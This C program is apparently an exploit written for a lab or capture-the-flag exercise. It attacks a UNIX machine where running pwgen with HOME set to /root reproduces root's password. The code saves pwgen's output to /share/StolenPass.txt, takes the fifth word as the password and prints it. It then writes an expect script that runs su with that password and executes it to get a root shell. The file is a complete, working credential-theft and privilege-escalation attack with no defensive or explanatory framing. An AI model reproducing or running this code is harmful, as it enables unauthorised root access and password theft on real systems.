#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// This code targets the weak security of this version of UNIX and stealing the password by 
//  running pwgen as root and reading from command line
int main(int argc, char *argv[]) {

    FILE * filepointer;
    char word[1024];
    int counter = 0;
    char * secret;
    char* secretcode;
    char* line1 = "#!/usr/bin/expect";
    char* line2 = "spawn su";
    char* line3 = "expect \"Password:\"";
    char* line5 = "interact";
    secretcode = malloc(1024);

    // runs pwgen masquerading as root user
    system("HOME=/root pwgen -w > /share/StolenPass.txt");
    
    filepointer = fopen("/share/StolenPass.txt", "r");
    
    if (filepointer == NULL) {
        printf("somethingk went wrong could not open the file");
        exit(EXIT_FAILURE);
    }
    
    while (fscanf(filepointer, "%s", word) == 1) {
        counter++;
        if (counter == 5) {
            secret = word;
            break;
        }
    }
    fclose(filepointer);
    printf("the secret password is: %s\n", secret);
    printf("\n");
    sprintf(secretcode, "send %s\\n", secret);
    printf("\n");
    filepointer = fopen("/share/stolenpasssuccess.sh", "w");
    fprintf(filepointer, "%s\n", line1);
    fprintf(filepointer, "%s\n", line2);
    fprintf(filepointer, "%s\n", line3);
    fprintf(filepointer, "%s\n", secretcode);
    fprintf(filepointer, "%s\n", line5);
    fclose(filepointer);
    system("chmod +x /share/stolenpasssuccess.sh");
    execve("/share/stolenpasssuccess.sh", NULL, NULL);

    return 0;
}
